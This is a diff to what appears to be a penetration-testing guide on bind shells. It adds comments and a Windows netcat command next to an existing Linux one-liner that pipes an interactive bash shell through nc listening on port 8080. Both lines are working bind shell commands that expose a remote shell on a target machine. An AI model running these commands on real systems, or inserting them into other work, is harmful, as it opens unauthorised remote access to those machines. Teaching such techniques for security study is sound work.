@@ -291,7 +291,11 @@ This is convenient if the target machine does not allow outgoing connections.
 On the target machine, we also use a payload to expose a shell to clients connecting to it (port > 1024 to not need sudo permission).  
 It is similar to the reverse shell payload, but this time it waits for an incoming connection instead of connecting to the target machine.
 ```shell
+# on Linux
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+
+# using netcat on Windows
+nc -l p 443 -e cmd.exe
 ```
 
 The target machine then needs to connect to it to interact with the exposed bind shell :
